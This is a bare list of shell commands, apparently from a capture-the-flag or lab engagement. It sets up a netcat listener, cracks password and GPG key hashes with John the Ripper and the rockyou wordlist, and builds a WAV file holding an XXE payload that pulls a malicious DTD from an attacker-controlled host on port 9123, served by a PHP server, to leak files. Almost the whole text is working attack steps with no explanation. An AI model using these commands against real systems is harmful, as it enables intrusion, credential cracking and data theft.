


```
$ nc -nlvp 4242
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
$ john --wordlist=/usr/share/wordlists/rockyou.txt pass_hash.txt
$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.10:9123/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
$ php -S 0.0.0.0:9123

$ gpg2john pass/test_pkey > test_hash
```
